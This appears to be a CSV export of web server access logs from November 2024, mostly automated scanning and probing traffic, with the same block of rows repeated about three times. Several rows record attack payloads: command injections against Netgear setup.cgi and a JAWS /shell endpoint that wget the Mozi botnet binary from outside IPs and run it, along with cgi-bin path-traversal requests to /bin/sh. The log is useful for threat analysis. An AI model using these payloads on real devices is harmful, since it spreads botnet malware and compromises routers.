ip,date,method,endpoint,status,size
128.218.84.80,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
75.188.230.251,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
103.132.231.182,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
179.99.94.11,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
145.184.232.244,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
27.174.242.95,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
66.88.2.53,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
38.96.159.63,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
155.239.167.4,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
126.235.244.125,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
142.59.202.236,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
7.129.6.236,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
68.224.244.249,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
24.149.41.33,19/Nov/2024:20:16:26 +0000,,-,408,
242.246.216.69,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
125.161.18.48,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
236.220.77.12,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
135.253.179.162,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
149.130.220.111,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
123.16.135.151,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
9.123.155.168,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
77.123.83.211,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
63.8.243.25,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
24.189.22.149,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
25.145.0.70,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
172.118.67.112,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
200.35.35.231,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
4.116.63.146,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
85.230.8.178,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
242.123.183.51,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
250.103.110.29,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
216.189.248.40,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
153.25.147.165,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
243.169.253.10,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
92.54.105.185,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
124.19.250.45,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
42.108.131.142,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
95.207.35.17,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
147.240.42.38,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
166.106.58.157,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
38.222.225.26,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
201.172.233.14,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
6.33.188.5,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
178.5.156.244,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
227.104.57.220,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
3.205.34.70,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
20.45.247.48,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
146.9.29.114,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
42.82.244.236,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
123.34.136.24,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
35.62.226.172,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
232.169.237.215,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
48.179.137.37,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
137.26.131.151,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
55.121.235.171,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
103.7.154.137,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
185.241.197.212,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
12.23.186.102,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
201.18.54.89,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
137.229.67.132,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
245.240.126.114,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
62.181.80.223,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
94.98.108.29,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
158.19.26.75,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
51.44.152.143,15/Nov/2024:00:35:31 +0000,,-,408,
152.125.206.244,15/Nov/2024:00:36:08 +0000,,-,408,
148.229.132.207,15/Nov/2024:00:36:30 +0000,,-,408,
234.21.104.147,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
66.78.166.100,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
74.32.141.77,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
87.157.228.137,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
135.73.67.225,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
57.35.213.152,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
176.52.250.37,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
250.214.26.70,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
6.21.254.139,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
189.13.90.102,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
6.87.23.231,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
188.6.77.114,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
196.182.248.208,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
163.221.224.72,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
170.238.192.117,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
85.249.2.156,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
26.94.65.122,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
163.14.87.99,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
41.122.211.64,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
67.34.79.240,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
25.210.33.94,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
99.201.67.210,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
66.17.228.68,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
5.225.184.169,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
173.88.144.133,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
194.118.100.199,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
182.15.101.32,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
223.208.99.94,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
170.2.98.224,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
65.7.78.112,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
43.202.30.101,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
85.137.118.218,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
190.234.240.216,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
136.204.151.195,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
4.169.108.110,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
84.93.201.97,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
124.146.198.46,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
137.190.133.132,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
97.75.88.33,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
18.164.228.228,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
95.13.214.1,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
28.138.81.99,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
24.206.14.122,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
45.253.146.151,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
3.9.167.95,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
162.67.92.245,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
93.86.40.56,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
108.141.107.134,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
21.63.97.216,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
15.232.150.35,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
217.56.216.59,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
216.90.16.184,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
82.169.17.107,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
201.19.107.6,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
85.7.56.94,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
149.116.183.117,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
60.20.231.51,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
245.196.52.55,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
157.66.205.92,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
239.112.31.47,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
179.55.40.197,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
14.45.141.196,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
43.175.187.199,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
152.173.150.134,19/Nov/2024:20:16:26 +0000,,-,408,
46.75.97.67,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
196.231.68.147,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
208.112.168.152,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
152.203.150.229,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
246.20.119.149,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
84.44.128.204,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
84.69.68.240,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
153.234.87.237,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
6.99.133.197,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
37.159.115.167,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
119.8.103.108,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
110.209.41.195,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
154.32.170.12,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
186.28.108.248,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
235.68.202.132,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
180.27.30.213,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
143.232.37.84,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
185.141.247.90,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
249.229.246.86,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
244.34.38.73,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
72.237.43.198,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
212.45.189.214,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
46.57.235.85,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
90.26.105.186,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
45.153.112.121,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
92.128.20.188,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
58.54.207.28,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
218.48.77.27,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
139.213.252.166,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
121.233.145.184,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
85.0.9.65,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
9.165.250.122,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
178.100.44.87,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
142.225.190.225,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
214.214.70.186,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
122.232.157.105,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
210.250.215.127,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
77.227.220.245,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
241.17.75.251,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
129.69.201.30,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
14.216.224.165,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
172.114.112.4,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
151.226.239.76,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
106.108.118.102,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
203.33.238.225,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
214.170.164.198,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
50.145.114.141,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
190.66.156.1,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
169.229.88.90,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
13.155.53.61,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
101.194.210.155,15/Nov/2024:00:35:31 +0000,,-,408,
193.220.121.250,15/Nov/2024:00:36:08 +0000,,-,408,
194.123.110.207,15/Nov/2024:00:36:30 +0000,,-,408,
201.125.36.11,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
199.216.121.26,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
94.203.129.74,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
160.90.201.74,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
128.61.211.230,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
83.160.65.230,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
58.12.168.10,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
243.224.12.135,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
128.199.160.142,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
49.205.126.142,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
44.193.58.151,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
236.252.15.202,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
224.82.95.83,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
149.91.132.229,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
212.158.238.171,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
157.4.28.148,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
239.10.119.221,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
138.209.59.167,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
208.73.13.81,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
32.149.93.25,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
15.165.61.32,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
54.245.196.130,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
30.231.212.186,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
88.49.26.134,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
219.7.245.125,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
225.66.35.185,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
76.2.160.150,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
66.204.2.84,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
47.218.85.164,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
35.238.78.250,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
139.180.248.68,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
190.56.62.98,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
112.74.120.0,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
184.14.109.101,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
155.167.126.38,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
131.133.45.253,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
253.18.90.40,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
46.174.230.103,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
218.8.131.241,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
231.118.55.207,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
21.28.51.53,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
92.71.62.92,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
146.251.126.113,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
158.242.148.128,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
185.244.143.70,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
234.47.44.56,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
68.82.18.7,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
234.62.7.2,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
21.214.163.151,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
129.222.141.8,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
185.230.22.247,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
218.100.131.68,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
41.177.121.67,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
50.161.26.204,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
220.155.123.79,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
189.253.42.208,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
111.225.143.37,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
24.142.147.227,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
129.167.225.233,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
214.40.197.93,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
39.223.33.244,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
111.206.128.2,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
31.42.94.246,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
106.66.92.235,19/Nov/2024:20:16:26 +0000,,-,408,
80.28.99.246,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
63.1.127.229,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
124.54.190.219,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
81.206.242.254,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
96.245.231.207,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
80.188.97.70,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
196.33.141.116,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
78.25.34.11,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
56.133.194.40,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
193.123.109.230,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
146.16.196.42,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
242.216.74.66,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
223.94.120.228,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
182.172.151.57,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
128.191.18.96,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
152.242.29.150,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
192.129.67.74,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
28.36.145.13,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
106.77.59.209,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
232.185.36.153,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
166.37.226.64,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
34.90.184.153,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
225.210.94.167,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
171.15.182.4,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
171.241.214.240,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
75.215.117.161,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
138.3.67.45,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
32.234.103.182,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
